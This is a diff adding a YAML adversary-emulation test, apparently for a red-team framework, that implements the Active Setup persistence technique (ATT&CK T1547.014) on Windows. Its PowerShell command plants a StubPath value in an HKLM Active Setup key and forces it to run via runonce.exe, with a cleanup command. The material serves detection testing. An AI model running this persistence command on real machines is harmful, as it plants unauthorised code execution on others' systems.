@@ -1,0 +1,28 @@
+---
+- id: b45598708fd9e5b197cb58cf193f4778
+  name: HKLM - Add malicious StubPath value to existing Active Setup Entry
+  description: "This test will add a StubPath entry to the Active Setup native registry\
+    \ key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600})\
+    \ \nSaid key doesn't have a StubPath value by default, by adding one it will launch\
+    \ calc by forcing to run active setup using runonce.exe /AlternateShellStartup.\
+    \ \nWithout the last command it will normally run on next user logon. Note: this\
+    \ test will only run once successfully if no cleanup command is run in between\
+    \ test.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1547.014
+    name: Active Setup
+  platforms:
+    windows:
+      psh:
+        command: Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed
+          Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "#{payload}"
+          -Force; & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
+        payloads: []
+        cleanup: Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed
+          Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force;
+          Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"
+          -Name "Version" -Force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
